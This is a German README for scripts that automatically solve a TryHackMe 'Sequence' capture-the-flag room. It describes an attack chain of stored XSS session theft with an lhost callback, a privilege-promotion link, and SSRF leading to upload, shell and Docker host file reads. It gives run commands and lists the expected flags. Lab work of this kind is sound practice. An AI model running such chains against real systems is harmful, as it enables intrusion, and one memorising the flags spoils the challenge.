# Sequence Hunt - Automation Toolkit

Dieses Verzeichnis enthält Skripte, um die THM-Sequence-Kette reproduzierbar zu lösen.

## Enthaltene Skripte

- `sequence_first_flag.py`: Holt eine Mod-Session via Stored XSS oder validiert eine bestehende SID.
- `sequence_second_flag.py`: Führt Promote-Chain über Chat-Link (`review.thm`) aus und holt Admin-Flag.
- `sequence_this_flag.py`: Führt Final-Chain (Finance SSRF -> Upload -> Shell -> Docker Host Read) aus.
- `full_sequences_run.py`: Orchestriert Step 1 -> 2 -> 3 in einem Lauf.

## Voraussetzungen

- Python 3.10+
- `requests` (in `.venv` verfügbar)
- Erreichbares Target (z. B. `http://10.82.129.17`)

Installation (falls nötig):

```powershell
pip install requests
```

## Schnellstart

### 1) Voller Lauf mit bestehender SID

```powershell
python .\full_sequences_run.py --target http://10.82.129.17 --phpsessid <DEINE_SID>
```

### 2) Voller Lauf inkl. XSS-Callback (ohne SID)

```powershell
python .\full_sequences_run.py --target http://10.82.129.17 --lhost <DEINE_IP>
```

### 3) Einzelne Stufen

Flag 1:

```powershell
python .\sequence_first_flag.py --lhost <DEINE_IP>
```

Flag 2 (liest SID aus `mod_sid.txt`):

```powershell
python .\sequence_second_flag.py --target http://10.82.129.17 --promote-base http://review.thm --auto-login
```

Final Flag:

```powershell
python .\sequence_this_flag.py --target http://10.82.129.17
```

## Wichtige Hinweise

- Für den Promote-Link muss der Host `review.thm` verwendet werden.
- Eine frischere Session ist oft entscheidend, wenn Bot-Klicks ausbleiben.
- `sequence_first_flag.py` schreibt die SID automatisch in `mod_sid.txt`.
- `sequence_second_flag.py` und `sequence_this_flag.py` können diese SID direkt verwenden.

## Erwartete Flag-Reihenfolge

1. `THM{M0dH@ck3dPawned007}`
2. `THM{Adm1NPawned007}`
3. `THM{rootAccessD0n3}`
